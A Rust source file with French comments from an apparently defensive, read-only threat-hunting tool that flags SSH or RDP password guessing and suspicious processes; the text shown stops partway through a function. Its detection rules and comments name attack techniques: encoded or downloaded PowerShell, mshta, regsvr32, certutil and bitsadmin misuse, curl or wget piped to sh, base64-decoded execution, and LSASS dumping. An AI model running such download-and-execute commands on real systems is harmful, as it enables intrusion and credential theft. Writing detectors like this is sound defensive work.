//! Chasse aux menaces, en direct : ce qu'un intrus laisse voir pendant qu'il est là, quand l'antivirus ne l'a pas
//! reconnu. Deux signes. Une connexion réussie depuis une adresse qui venait de rater des mots de passe en rafale :
//! le plus grave, un mot de passe deviné. Des programmes en marche qui ont la forme d'une attaque : outil offensif
//! connu, ligne de commande qui télécharge ou cache ce qu'elle exécute, programme lancé d'un dossier où rien ne
//! s'installe. Chaque signe se juge par une fonction pure, testée sous Linux et sous Wine ; la lecture (journaux,
//! processus) est propre à chaque système. Lecture seule : rien n'est arrêté, rien n'est envoyé.

use std::collections::{HashMap, HashSet};
use std::net::IpAddr;

use chrono::NaiveDateTime;

use super::regles::{Os, regle};
use super::{Constat, alerte, impossible, ok};
use crate::risk::Niveau;
use crate::ui::{affichable, resume};
use crate::{mot_masque, tr, trf};

regle!(
    "COM-CPT-003",
    Os::Tous,
    605,
    (
        "connexion réussie après une rafale d'échecs",
        "successful sign-in after a burst of failures"
    ),
    &["CIS Controls v8 8.11", "MITRE ATT&CK T1110.001", "MITRE ATT&CK T1078"],
    connexion_forcee
);

regle!(
    "COM-PRG-001",
    Os::Tous,
    675,
    ("programmes en marche suspects", "suspicious running programs"),
    &[
        "CIS Controls v8 10.7",
        "MITRE ATT&CK T1059.001",
        "MITRE ATT&CK T1218",
        "MITRE ATT&CK T1105",
        "MITRE ATT&CK T1003.001",
        "MITRE ATT&CK T1496",
        "MITRE ATT&CK T1204.002"
    ],
    programmes_suspects
);

// ───────────────────────────── Mot de passe deviné ─────────────────────────────

/// Échecs depuis une même adresse à partir desquels une connexion qui réussit ensuite n'est plus une faute de frappe.
pub(crate) const SEUIL_ECHECS: usize = 10;

/// Une tentative de connexion lue dans un journal, dans l'ordre où elle a eu lieu.
#[derive(Clone, Debug)]
pub(crate) struct Tentative {
    pub adresse: IpAddr,
    /// Le compte, pour une connexion réussie (celui d'un échec ne sert pas).
    pub compte: String,
    pub reussie: bool,
}

/// Une connexion réussie depuis une adresse qui avait raté au moins `SEUIL_ECHECS` fois avant elle.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Intrusion {
    pub adresse: IpAddr,
    pub compte: String,
    pub echecs: usize,
}

/// Les connexions réussies depuis une adresse qui avait raté au moins `SEUIL_ECHECS` fois avant elle : une par adresse
/// et par compte, dans l'ordre. La machine elle-même (127.0.0.1, ::1) n'est pas une source : un programme d'ici qui
/// garde un vieux mot de passe n'est pas une intrusion.
pub(crate) fn intrusions(tentatives: &[Tentative]) -> Vec<Intrusion> {
    let mut echecs: HashMap<IpAddr, usize> = HashMap::new();
    let mut trouvees: Vec<Intrusion> = Vec::new();
    for t in tentatives
        .iter()
        .filter(|t| !t.adresse.is_loopback() && !t.adresse.is_unspecified())
    {
        let n = echecs.entry(t.adresse).or_default();
        if !t.reussie {
            *n += 1;
        } else if *n >= SEUIL_ECHECS && !trouvees.iter().any(|i| i.adresse == t.adresse && i.compte == t.compte) {
            trouvees.push(Intrusion {
                adresse: t.adresse,
                compte: t.compte.clone(),
                echecs: *n,
            });
        }
    }
    trouvees
}

/// L'adresse et le port d'origine d'une ligne de sshd : ceux du dernier « port » de la ligne. Avant lui, le nom
/// d'utilisateur tenté est écrit tel que l'attaquant l'a choisi, et peut contenir un faux « from … port … ». Commun à
/// Linux (journal de systemd) et à OpenSSH pour Windows (journal OpenSSH/Operational), qui écrivent les mêmes messages.
#[cfg_attr(target_os = "macos", allow(dead_code))]
pub(crate) fn origine_ssh(ligne: &str) -> Option<(IpAddr, u16)> {
    let mots: Vec<&str> = ligne.split_whitespace().collect();
    let i = mots.iter().rposition(|m| *m == "port")?;
    let ip = mots.get(i.checked_sub(1)?)?.parse::<IpAddr>().ok()?.to_canonical();
    let port = mots.get(i + 1)?.trim_end_matches(':').parse().ok()?;
    Some((ip, port))
}

/// Les tentatives de connexion à sshd, dans l'ordre du journal, chacune avec ce qui la date (`D` : rien sous Linux,
/// l'heure de l'événement sous Windows) : chaque mot de passe raté (« Failed password », « Failed
/// keyboard-interactive »), chaque connexion d'un compte qui n'existe pas où aucun mot de passe n'a été essayé
/// (« Invalid user » seul : sinon, ses « Failed password » la comptent déjà), et chaque connexion acceptée, avec son
/// compte. Seuls comptent les messages qui commencent ainsi : un nom d'utilisateur tenté (« Invalid user Accepted
/// password for … ») vient de l'attaquant.
#[cfg_attr(target_os = "macos", allow(dead_code))]
pub(crate) fn tentatives_ssh_datees<D: Copy>(lignes: &[(D, &str)]) -> Vec<(D, Tentative)> {
    let rate = |l: &str| l.starts_with("Failed password ") || l.starts_with("Failed keyboard-interactive");
    let essayees: HashSet<(IpAddr, u16)> = lignes
        .iter()
        .filter(|(_, l)| rate(l))
        .filter_map(|(_, l)| origine_ssh(l))
        .collect();
    let mut sans_essai = HashSet::new();
    lignes
        .iter()
        .filter_map(|&(quand, l)| {
            let (adresse, port) = origine_ssh(l)?;
            let echec = Tentative {
                adresse,
                compte: String::new(),
                reussie: false,
            };
            if rate(l) {
                return Some((quand, echec));
            }
            if l.starts_with("Invalid user ") {
                return (!essayees.contains(&(adresse, port)) && sans_essai.insert((adresse, port)))
                    .then_some((quand, echec));
            }
            // « Accepted password for alice from 203.0.113.5 port 50000 ssh2 » : le compte, entre « for » et le
            // dernier « from ».
            let reste = l.strip_prefix("Accepted ")?;
            let mots: Vec<&str> = reste.split_whitespace().collect();
            let pour = mots.iter().position(|m| *m == "for")?;
            let depuis = mots.iter().rposition(|m| *m == "from")?;
            Some((
                quand,
                Tentative {
                    compte: mots.get(pour + 1..depuis)?.join(" "),
                    reussie: true,
                    ..echec
                },
            ))
        })
        .collect()
}

/// Les comptes touchés, montrés inoffensifs : le nom vient du journal.
fn comptes(intrusions: &[Intrusion]) -> String {
    let mut noms: Vec<String> = intrusions.iter().map(|i| affichable(&i.compte)).collect();
    noms.sort();
    noms.dedup();
    noms.join(", ")
}

/// Que faire : le mot de passe d'abord, puis fermer la porte, puis l'enquête. La porte est le Bureau à distance sous
/// Windows ; ailleurs, la connexion par mot de passe de SSH (les clés seules), et recharger sshd ne coupe pas les
/// connexions en cours.
fn conseil(systeme: Os, comptes: &str) -> String {
    match systeme {
        Os::Windows => trf!(
            "Changez tout de suite le mot de passe de {comptes}, coupez le Bureau à distance s'il ne sert pas, et regardez ce qui s'est passé : vanguard depanner traces",
            "Change the password of {comptes} right away, turn off Remote Desktop if it is not used, and look at what happened: vanguard depanner traces"
        ),
        Os::Linux | Os::MacOs | Os::Tous => trf!(
            "Changez tout de suite le mot de passe de {comptes} (passwd), coupez la connexion par mot de passe de SSH (PasswordAuthentication no, puis recharger sshd), et regardez ce qui s'est passé : vanguard depanner traces",
            "Change the password of {comptes} right away (passwd), turn off password sign-in for SSH (PasswordAuthentication no, then reload sshd), and look at what happened: vanguard depanner traces"
        ),
    }
}

/// Le constat des connexions réussies après une rafale d'échecs, avec le conseil de ce système. `partiel` : ce que la
/// lecture du journal n'a pas pu voir (une borne atteinte), dit avec le constat sain, qui n'est jamais sans réserve.
pub(crate) fn juger_intrusions(intrusions: &[Intrusion], systeme: Os, partiel: Option<&str>) -> Constat {
    if intrusions.is_empty() {
        let mut texte = trf!(
            "Aucune connexion réussie depuis une adresse qui venait de rater au moins {SEUIL_ECHECS} fois.",
            "No successful sign-in from an address that had just failed at least {SEUIL_ECHECS} times."
        );
        if let Some(p) = partiel {
            texte.push(' ');
            texte.push_str(p);
        }
        return ok("Comptes", texte);
    }
    let liste: Vec<String> = intrusions
        .iter()
        .map(|i| {
            trf!(
                "depuis {} sur le compte {} après {} échecs",
                "from {} on the account {} after {} failures",
                i.adresse,
                affichable(&i.compte),
                i.echecs
            )
        })
        .collect();
    let mut texte = trf!(
        "Connexion réussie {} : un mot de passe a sans doute été deviné.",
        "Successful sign-in {}: a password was most likely guessed.",
        resume(&liste, 3, tr!(" ; ", "; "))
    );
    if !intrusions
        .iter()
        .any(|i| crate::socle::adresses::sur_internet(i.adresse))
    {
        texte.push_str(tr!(
            " L'adresse est sur le réseau local : un appareil de votre domicile qui gardait un vieux mot de passe l'explique aussi.",
            " The address is on the local network: a device at home that kept an old password also explains it."
        ));
    }
    alerte("Comptes", Niveau::Critique, texte)
        .manuel(conseil(systeme, &comptes(intrusions)), &["vanguard depanner traces"])
}

/// Les tentatives lues dans un journal, et ce que la lecture n'a pas pu voir, quand elle a atteint une borne.
type Lues = (Vec<Tentative>, Option<String>);

/// La vérification : les tentatives lues dans le journal du système, jugées. Rien sans serveur à surveiller ; un
/// journal qui ne se lit pas le dit (non vérifié, jamais sain).
fn connexion_forcee() -> Vec<Constat> {
    match tentatives_lues() {
        None => Vec::new(),
        Some(Err(refus)) => vec![refus],
        Some(Ok((tentatives, partiel))) => vec![juger_intrusions(
            &intrusions(&tentatives),
            Os::actuel(),
            partiel.as_deref(),
        )],
    }
}

/// Sous Linux : le journal de sshd des dernières 24 h.
#[cfg(target_os = "linux")]
fn tentatives_lues() -> Option<Result<Lues, Constat>> {
    Some(match super::linux::tentatives_ssh_lues()? {
        Ok(tentatives) => Ok((tentatives, None)),
        Err(refus) => Err(refus),
    })
}

/// Sous Windows : le journal de la sécurité des 7 derniers jours, qui refuse sans droits d'administrateur.
#[cfg(windows)]
#[allow(clippy::unnecessary_wraps)] // même signature que sous Linux, où il peut n'y avoir aucun serveur SSH
fn tentatives_lues() -> Option<Result<Lues, Constat>> {
    Some(super::windows::evenements::tentatives_lues().map_err(|raison| impossible("Comptes", raison)))
}

/// Sous macOS : sshd écrit dans le journal unifié, qui ne se lit qu'en lançant « log show » (des minutes, pour une
/// journée). Sans sshd (Session à distance coupée, le cas courant), rien à lire, comme sous Linux sans serveur SSH.
#[cfg(target_os = "macos")]
fn tentatives_lues() -> Option<Result<Lues, Constat>> {
    let ecoutes =
        super::sortie("netstat", &["-an", "-p", "tcp"]).map(|netstat| super::unix::lire_netstat(&netstat, true));
    let services = std::fs::read_to_string("/etc/services").unwrap_or_default();
    let en_marche =
        programmes_en_marche().map(|(liste, _)| liste.iter().any(|p| p.nom == "sshd" || p.nom.starts_with("sshd-")));
    // Un sshd lancé par launchd à chaque connexion, sur le port de sa propre plist (Session à distance recopiée dans
    // /Library/LaunchDaemons) : aucun sshd ne tourne entre deux connexions, et /etc/services peut dire 22.
    let lance_par_launchd = std::fs::read_dir("/Library/LaunchDaemons").is_ok_and(|dossier| {
        dossier
            .flatten()
            .any(|f| std::fs::read(f.path()).is_ok_and(|o| plist_de_sshd(&o)))
    });
    let sshd = if lance_par_launchd { Some(true) } else { en_marche };
    tentatives_sans_journal(ecoutes.as_deref(), port_ssh(&services), sshd)
}

/// Une plist de launchd qui lance sshd (XML ou binaire : le chemin du programme y reste en clair).
#[cfg(any(target_os = "macos", test))]
fn plist_de_sshd(octets: &[u8]) -> bool {
    octets.windows(4).any(|m| m == b"sshd")
}

/// Le port du service « ssh » d'/etc/services : celui où launchd ouvre Session à distance, 22 sauf s'il a été changé.
#[cfg(any(target_os = "macos", test))]
fn port_ssh(services: &str) -> Option<u16> {
    services.lines().find_map(|l| {
        let mut mots = l.split('#').next()?.split_whitespace();
        (mots.next()? == "ssh").then_some(())?;
        mots.next()?.strip_suffix("/tcp")?.parse().ok()
    })
}

/// La décision de macOS, à part pour se tester partout. `ecoutes` : les ports TCP en écoute, `None` si netstat n'a
/// pas répondu ; `port_ssh` : celui d'/etc/services ; `sshd` : un sshd en marche ou une plist de launchd qui le lance,
/// `None` si ps n'a pas répondu. Rien à lire seulement si rien n'écoute sur 22 ni sur le port de ssh et qu'aucun sshd
/// n'est là (un sshd de Homebrew sur un autre port tourne sans arrêt). Un sshd qui n'écoute que la machine elle-même
/// compte aussi : ses échecs vont au journal non lu. netstat ou ps muets, ou sshd présent : non vérifié, jamais sain.
#[cfg(any(target_os = "macos", test))]
fn tentatives_sans_journal(
    ecoutes: Option<&[(String, u16)]>,
    port_ssh: Option<u16>,
    sshd: Option<bool>,
) -> Option<Result<Lues, Constat>> {
    let ecoute_ssh = ecoutes.map(|ports| ports.iter().any(|(_, port)| *port == 22 || Some(*port) == port_ssh));
    let raison = match (ecoute_ssh, sshd) {
        (Some(false), Some(false)) => return None,
        (Some(true), _) | (_, Some(true)) => tr!(
            "sshd écrit dans le journal unifié de macOS, que Vanguard ne lit pas",
            "sshd writes to macOS's unified log, which Vanguard does not read"
        ),
        (None, _) => tr!(
            "netstat n'a pas dit si sshd écoute",
            "netstat did not tell whether sshd is listening"
        ),
        (Some(false), None) => tr!(
            "ps n'a pas dit si sshd tourne",
            "ps did not tell whether sshd is running"
        ),
    };
    Some(Err(impossible("Comptes", raison)))
}

// ───────────────────────────── Programmes en marche ─────────────────────────────

/// Un programme en marche, tel que le système le donne.
#[derive(Clone, Debug, Default)]
pub(crate) struct EnMarche {
    pub pid: u32,
    pub parent: Option<u32>,
    /// Son nom : celui de son fichier sous Windows et macOS, le nom court du noyau sous Linux.
    pub nom: String,
    /// Le chemin de son programme, quand il se lit (sous Linux, ceux du compte seulement).
    pub chemin: Option<String>,
    /// Sa ligne de commande, quand elle se lit sans droits.
    pub ligne: Option<String>,
    /// Son programme n'est plus sur le disque : effacé après son lancement.
    pub sans_fichier: bool,
    /// Sa naissance (UTC), quand le système la donne. Sous Windows, le numéro d'un parent mort peut passer à un
    /// processus plus jeune, qui n'est pas ce parent ; Linux et macOS rattachent l'orphelin à un autre parent.
    pub ne: Option<NaiveDateTime>,
}

/// Un motif trouvé dans une ligne de commande : pourquoi elle est suspecte, son texte, et sa place (en octets). Seul
/// ce texte est montré, avec le programme : ce qui précède (« GITHUB_TOKEN=… », « Authorization='Bearer …' ») comme
/// ce qui suit (une adresse, un jeton) peut porter un secret.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Motif {
    pub raison: &'static str,
    /// Le motif tel qu'il est écrit : « -enc », « IEX », « curl », « base64 -d ».
    pub mot: String,
    pub debut: usize,
    pub fin: usize,
}

/// Ce qui rend un programme en marche suspect : le niveau, la raison, ce qui est montré de lui (le début de sa ligne
/// de commande jusqu'au motif, ou son chemin), et si son programme a été effacé depuis son lancement.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Soupcon {
    pub niveau: Niveau,
    pub raison: &'static str,
    pub extrait: Option<String>,
    pub efface: bool,
}

/// Ce qu'on montre au plus d'une ligne de commande ou d'un chemin, en caractères.
const LONGUEUR_EXTRAIT: usize = 60;

/// Le nom de fichier d'un chemin, quel que soit le séparateur, sans guillemets autour.
pub(crate) fn nom_de_fichier(chemin: &str) -> &str {
    let chemin = chemin.trim_matches(['"', '\'']);
    chemin.rsplit(['/', '\\']).next().unwrap_or(chemin)
}

/// Les mots d'un texte, chacun avec la position, en octets, de sa fin. Ils sont séparés par des blancs et par ce qui
/// sépare ou groupe les commandes du shell (« ( ) ; & | ` { } ») : « (curl -fsSL …||wget …)|sh », la ligne de cron
/// des mineurs, cachait curl dans « (curl » et wget dans « a.sh||wget ».
pub(crate) fn mots(texte: &str) -> Vec<(&str, usize)> {
    let separe = |c: char| c.is_whitespace() || matches!(c, '(' | ')' | ';' | '&' | '|' | '`' | '{' | '}');
    let mut mots = Vec::new();
    let mut debut = None;
    for (i, c) in texte.char_indices().chain(std::iter::once((texte.len(), ' '))) {
        match (separe(c), debut) {
            (true, Some(d)) => {
                mots.push((&texte[d..i], i));
                debut = None;
            }
            (false, None) => debut = Some(i),
            _ => {}
        }
    }
    mots
}

/// La fin (en octets) du premier `mot` de `bas` (déjà en minuscules) qui n'est pas collé à une lettre ou un chiffre :
/// « iex » dans « IEX(… » ou « | iex », pas dans « windex ».
fn fin_du_mot(bas: &str, mot: &str) -> Option<usize> {
    let lettre = |c: char| c.is_alphanumeric() || c == '_';
    bas.match_indices(mot)
        .map(|(i, _)| (i, i + mot.len()))
        .find(|&(debut, fin)| {
            !bas[..debut].chars().next_back().is_some_and(lettre) && !bas[fin..].chars().next().is_some_and(lettre)
        })
        .map(|(_, fin)| fin)
}

/// Les détournements connus d'un outil livré avec Windows (« LOLBin ») : PowerShell qui exécute une commande cachée en
/// base64 ou du texte téléchargé, mshta, regsvr32 et rundll32 qui lancent un script venu d'Internet, certutil et
/// bitsadmin qui téléchargent ou décodent un fichier. `programme` : son nom de fichier en minuscules, sans « .exe » ;
/// `args` : ses arguments tels quels. `None` : l'usage ordinaire de ces outils (PowerShell seul n'a rien de suspect).
pub(crate) fn detournement(programme: &str, args: &str) -> Option<Motif> {
    // Minuscules ASCII seulement : chaque position trouvée vaut dans `args`.
    let bas = args.to_ascii_lowercase();
    let mots = mots(&bas);
    // Le premier mot qui répond, et sa place : « /x » lu comme « -x » (Windows accepte les deux), comme chaque autre
    // tiret de `tirets`.
    let option = |tirets: &[char], test: &dyn Fn(&str) -> bool| {
        mots.iter()
            .find(|(m, _)| {
                let m = m.trim_matches('"');
                match m.strip_prefix(tirets) {
                    Some(reste) => test(&format!("-{reste}")),
                    None => test(m),
                }
            })
            .map(|&(m, fin)| (fin - m.len(), fin))
    };
    let premier = |motifs: &[&str]| {
        motifs
            .iter()
            .filter_map(|m| bas.find(m).map(|i| (i, i + m.len())))
            .min_by_key(|&(_, fin)| fin)
    };
    let mot_entier = |m: &str| fin_du_mot(&bas, m).map(|fin| (fin - m.len(), fin));
    // Le motif à sa place, tel qu'il est écrit dans `args`, sans guillemets autour.
    let motif = |raison: &'static str| {
        move |(debut, fin): (usize, usize)| Motif {
            raison,
            mot: args[debut..fin].trim_matches(['"', '\'']).to_string(),
            debut,
            fin,
        }
    };
    match programme {
        "powershell" | "pwsh" => {
            // PowerShell lit aussi les tirets longs (–, —, ―) comme « - » : « –enc » cache autant que « -enc ».
            let tirets = ['/', '\u{2013}', '\u{2014}', '\u{2015}'];
            let cachee = option(&tirets, &|m: &str| {
                m == "-e" || m == "-ec" || (m.starts_with("-en") && "-encodedcommand".starts_with(m))
            });
            if let Some(place) = cachee {
                return Some(motif(tr!(
                    "commande PowerShell cachée en base64",
                    "PowerShell command hidden in base64"
                ))(place));
            }
            let execute = ["iex", "invoke-expression"]
                .into_iter()
                .filter_map(mot_entier)
                .min_by_key(|&(_, fin)| fin);
            let telecharge = mot_entier("downloadstring");
            let raison = match (execute, telecharge) {
                (Some(_), Some(_)) => tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                ),
                (Some(_), None) => tr!(
                    "PowerShell exécute du texte comme une commande (Invoke-Expression)",
                    "PowerShell runs text as a command (Invoke-Expression)"
                ),
                (None, Some(_)) => tr!(
                    "PowerShell télécharge un script (DownloadString)",
                    "PowerShell downloads a script (DownloadString)"
                ),
                (None, None) => return None,
            };
            execute
                .into_iter()
                .chain(telecharge)
                .min_by_key(|&(_, fin)| fin)
                .map(motif(raison))
        }
        "mshta" => premier(&["http:", "https:", "javascript:", "vbscript:"]).map(motif(tr!(
            "mshta lance un script venu d'Internet",
            "mshta runs a script from the Internet"
        ))),
        "regsvr32" => premier(&["/i:http", "-i:http", "scrobj.dll"]).map(motif(tr!(
            "regsvr32 charge un script distant",
            "regsvr32 loads a remote script"
        ))),
        "rundll32" => {
            premier(&["javascript:"]).map(motif(tr!("rundll32 exécute du JavaScript", "rundll32 runs JavaScript")))
        }
        "certutil" => option(&['/'], &|m: &str| m == "-urlcache" || m == "-decode").map(motif(tr!(
            "certutil détourné pour télécharger ou décoder un fichier",
            "certutil misused to download or decode a file"
        ))),
        "bitsadmin" => option(&['/'], &|m: &str| m == "-transfer").map(motif(tr!(
            "bitsadmin détourné pour télécharger un fichier",
            "bitsadmin misused to download a file"
        ))),
        _ => None,
    }
}

/// Les morceaux d'une ligne de commande séparés par un tube « | » (pas « || », le « ou » du shell), chacun avec sa
/// position de début.
fn morceaux_du_tube(ligne: &str) -> Vec<(usize, &str)> {
    let octets = ligne.as_bytes();
    let mut morceaux = Vec::new();
    let mut debut = 0;
    for (i, &o) in octets.iter().enumerate() {
        let seul = o == b'|' && (i == 0 || octets[i - 1] != b'|') && octets.get(i + 1) != Some(&b'|');
        if seul {
            morceaux.push((debut, &ligne[debut..i]));
            debut = i + 1;
        }
    }
    morceaux.push((debut, &ligne[debut..]));
    morceaux
}

/// Les programmes qui en lancent un autre : passés, avec leurs options, pour trouver le vrai interpréteur d'un morceau
/// de tube (« | sudo -u root sh », « | env -i sh », « | busybox sh », « | exec bash »).
const RELAIS: [&str; 5] = ["sudo", "doas", "env", "busybox", "exec"];

/// « NOM=valeur » : une variable donnée au programme qui suit, pas un programme.
fn affectation(mot: &str) -> bool {
    mot.split_once('=').is_some_and(|(nom, _)| {
        nom.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
            && nom.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
    })
}

/// Les options d'un relais suivies d'une valeur (un compte, un groupe, un dossier, une invite, un nom), pas d'un
/// programme : « | sudo -p x sh » lance sh, pas x.
fn option_a_valeur(relais: &str, option: &str) -> bool {
    match relais {
        "sudo" => matches!(
            option,
            "-u" | "-g"
                | "-C"
                | "-D"
                | "-h"
                | "-p"
                | "-r"
                | "-t"
                | "-T"
                | "-U"
                | "-R"
                | "--user"
                | "--group"
                | "--close-from"
                | "--chdir"
                | "--host"
                | "--prompt"
                | "--role"
                | "--type"
                | "--command-timeout"
                | "--other-user"
                | "--chroot"
        ),
        "doas" => matches!(option, "-u" | "-C"),
        "env" => matches!(option, "-u" | "-C" | "--unset" | "--chdir"),
        "exec" => option == "-a",
        _ => false,
    }
}

/// « sudo -s », « sudo -i », « doas -s » : le relais ouvre lui-même un shell, qui lit le tube s'il ne reçoit aucun
/// programme. Les options courtes se groupent (« sudo -Es »).
fn ouvre_un_shell(relais: &str, option: &str) -> bool {
    let groupe = |lettres: &str| {
        option.strip_prefix('-').is_some_and(|o| {
            !o.starts_with('-') && o.chars().all(|c| c.is_ascii_alphabetic()) && o.chars().any(|c| lettres.contains(c))
        })
    };
    match relais {
        "sudo" => matches!(option, "--shell" | "--login") || groupe("si"),
        "doas" => groupe("s"),
        _ => false,
    }
}

/// Le programme qui reçoit un morceau de tube : les relais, leurs options (et la valeur de celles qui en prennent une,
/// un compte, un groupe, une invite, pas un programme) et les variables passés. Un relais qui ouvre lui-même un shell
/// sans programme à lancer (« sudo -s », « sudo -i », « su », « su - root ») : « sh », le shell qui lit le tube.
fn programme_du_morceau(morceau: &str) -> Option<&str> {
    let mut relais: &str = "";
    let mut valeur_d_option = false;
    let mut shell = false;
    let mots = mots(morceau);
    let mut suite = mots.iter().map(|(m, _)| *m);
    while let Some(m) = suite.next() {
        if std::mem::take(&mut valeur_d_option) || affectation(m) {
            continue;
        }
        // Le nom sans la casse ; les options la gardent : « sudo -H » (dossier personnel) n'est pas « sudo -h hôte ».
        let nom = nom_de_fichier(m).to_ascii_lowercase();
        if let Some(r) = RELAIS.iter().find(|r| **r == nom) {
            relais = r;
            continue;
        }
        if m.starts_with('-') {
            valeur_d_option = option_a_valeur(relais, m);
            shell |= ouvre_un_shell(relais, m);
            continue;
        }
        if nom == "su" {
            return su(suite);
        }
        return Some(m);
    }
    shell.then_some("sh")
}

/// Ce que lance « su » : le programme donné à -c, sinon le shell du compte, qui lit le tube (« | su », « | su - root »).
fn su<'a>(mut suite: impl Iterator<Item = &'a str>) -> Option<&'a str> {
    while let Some(m) = suite.next() {
        if matches!(m, "-c" | "--command") {
            return suite.next().map(|c| c.trim_start_matches(['"', '\'']));
        }
        if let Some(c) = m.strip_prefix("--command=") {
            return Some(c.trim_start_matches(['"', '\'']));
        }
    }
    Some("sh")
}

/// Un script téléchargé (curl, wget) ou décodé (base64 -d) passé aussitôt à un interpréteur par un tube : ce qui
/// s'exécute ne touche jamais le disque. Le motif est le mot curl ou wget, ou base64 et son option : l'adresse qui
/// suit, qui peut porter un jeton, n'est pas montrée.
pub(crate) fn passe_a_un_shell(ligne: &str) -> Option<Motif> {
    // ash : le shell de busybox, celui d'Alpine, des routeurs et des images Docker légères (« | ash »,
    // « | busybox ash »).
    const INTERPRETES: [&str; 9] = ["sh", "ash", "bash", "zsh", "dash", "ksh", "python", "python3", "perl"];
    let bas = ligne.to_ascii_lowercase();
    let morceaux = morceaux_du_tube(&bas);
    // Le morceau lu tel qu'il est écrit (les minuscules gardent la place de chaque octet) : la casse d'une option compte.
    let interprete = |&(debut, morceau): &(usize, &str)| {
        programme_du_morceau(&ligne[debut..debut + morceau.len()])
            .is_some_and(|p| INTERPRETES.contains(&nom_de_fichier(&p.to_ascii_lowercase())))
    };
    for (k, (debut, morceau)) in morceaux.iter().enumerate() {
        if !morceaux[k + 1..].iter().any(interprete) {
            continue;
        }
        // Chaque mot du morceau, à sa place dans la ligne : lu en minuscules, montré tel qu'il est écrit.
        let places: Vec<(usize, usize)> = mots(morceau)
            .into_iter()
            .map(|(m, fin)| (debut + fin - m.len(), debut + fin))
            .collect();
        let nom = |&(a, b): &(usize, usize)| nom_de_fichier(&bas[a..b]);
        let ecrit = |(a, b): (usize, usize)| nom_de_fichier(&ligne[a..b]).to_string();
        if let Some(&place) = places.iter().find(|p| ["curl", "wget"].contains(&nom(p))) {
            return Some(Motif {
                raison: tr!(
                    "télécharge un script et l'exécute aussitôt",
                    "downloads a script and runs it right away"
                ),
                mot: ecrit(place),
                debut: place.0,
                fin: place.1,
            });
        }
        if let Some(i) = places.iter().position(|p| nom(p) == "base64")
            && let Some(&option) = places[i + 1..].iter().find(|p| matches!(nom(p), "-d" | "--decode"))
        {
            return Some(Motif {
                raison: tr!(
                    "commande cachée en base64, exécutée aussitôt",
                    "command hidden in base64, run right away"
                ),
                mot: format!("{} {}", ecrit(places[i]), ecrit(option)),
                debut: places[i].0,
                fin: option.1,
            });
        }
    }
    None
}

/// Le bout d'un texte montré : inoffensif, et pas plus de `LONGUEUR_EXTRAIT` caractères. Trop long, c'est le début qui
/// tombe : la fin d'un extrait de ligne de commande est le motif, la fin d'un chemin le programme. `suite` : le texte
/// continuait, coupé exprès.
fn extrait(texte: &str, suite: bool) -> String {
    let texte = affichable(texte.trim());
    let caracteres: Vec<char> = texte.chars().collect();
    let mut montre = if caracteres.len() > LONGUEUR_EXTRAIT {
        let garde: String = caracteres[caracteres.len() - (LONGUEUR_EXTRAIT - 1)..].iter().collect();
        format!("…{garde}")
    } else {
        texte
    };
    if suite {
        montre.push('…');
    }
    montre
}

/// Ce qui est montré d'une ligne de commande suspecte : son programme et le motif, rien d'autre. Ce qui les sépare
/// devient « … » : une variable ou un en-tête écrit avant le motif peut porter un secret. `programme` : son nom, et où
/// il finit dans `texte` (`None`, ou au-delà du début du motif : le motif seul). `texte` contient le motif à sa place.
fn montrer_le_motif(programme: Option<(&str, usize)>, texte: &str, m: &Motif) -> String {
    let montre = match programme {
        Some((nom, fin)) if fin <= m.debut => {
            let entre = texte
                .get(fin..m.debut)
                .unwrap_or("")
                .trim_matches(|c: char| c.is_whitespace() || c == '"' || c == '\'');
            let entre = if entre.is_empty() { "" } else { "… " };
            format!("{nom} {entre}{}", m.mot)
        }
        _ => m.mot.clone(),
    };
    extrait(&montre, m.fin < texte.trim_end().len())
}

/// Une ligne de commande qui télécharge ou cache ce qu'elle exécute : sa raison, et ce qu'on en montre (son programme
/// et le motif).
pub(crate) fn commande_suspecte(ligne: &str) -> Option<(&'static str, String)> {
    // Le programme se lit de deux façons : un chemin à espaces sans guillemets (« C:\Program Files\…\x.exe -a »)
    // demande `decouper_commande`, qui coupe au premier « .exe » ; mais « certutil -decode a.txt a.exe », tapé sans
    // « .exe » au programme, se coupe au premier blanc.
    let ligne = ligne.trim();
    let au_premier_blanc = ligne
        .split_once(char::is_whitespace)
        .map_or((ligne, ""), |(e, a)| (e, a.trim_start()));
    let au_premier_blanc = (au_premier_blanc.0.to_string(), au_premier_blanc.1.to_string());
    for (exe, args) in [crate::commande::decouper_commande(ligne), au_premier_blanc] {
        let fichier = nom_de_fichier(&exe);
        let programme = fichier.to_ascii_lowercase();
        let programme = programme.strip_suffix(".exe").unwrap_or(&programme);
        if let Some(m) = detournement(programme, &args) {
            return Some((m.raison, montrer_le_motif(Some((fichier, 0)), &args, &m)));
        }
    }
    let m = passe_a_un_shell(ligne)?;
    // Le programme de la ligne, montré s'il est un seul mot qui n'est pas une variable (« GITHUB_TOKEN=… curl »).
    let (exe, args) = crate::commande::decouper_commande(ligne);
    let fichier = nom_de_fichier(&exe);
    let programme = (!fichier.contains(char::is_whitespace) && !fichier.contains('='))
        .then_some((fichier, ligne.len().saturating_sub(args.len())));
    Some((m.raison, montrer_le_motif(programme, ligne, &m)))
}

/// Le nom d'un fichier est-il celui de l'outil, en entier, avec ou sans extension (« xmrig », « xmrig.exe »,
/// « laZagne.py ») ? Jamais un préfixe : « sharphound_parser.py » ou « Rubeus-Audit.ps1 » ne sont pas ces outils.
fn est_l_outil(nom: &str, outil: &str) -> bool {
    nom == outil || nom.strip_prefix(outil).is_some_and(|reste| reste.starts_with('.'))
}

/// Un outil offensif connu, reconnu au nom entier de son fichier : voleurs de mots de passe, outils d'attaque
/// d'Active Directory, mineur de cryptomonnaie, copie de la mémoire de LSASS. `noms` : le nom du processus, celui de
/// son fichier, et pour un interpréteur (Python, PowerShell…) chaque mot de sa ligne de commande, où est le script.
/// Rend la raison et la place, dans `noms`, du nom reconnu.
fn outil_offensif(noms: &[&str], ligne: &str) -> Option<(&'static str, usize)> {
    let bas = ligne.to_ascii_lowercase();
    for (i, nom) in noms.iter().enumerate() {
        let n = nom_de_fichier(nom).to_ascii_lowercase();
        // Les noms d'outils cherchés sont masqués (`crate::masque`) : en clair dans le binaire, un antivirus y
        // reconnaîtrait l'outil lui-même et prendrait Vanguard pour lui. Les noms *affichés* restent lisibles (`tr!`).
        let est = |outils: &[&str]| outils.iter().any(|o| est_l_outil(&n, o));
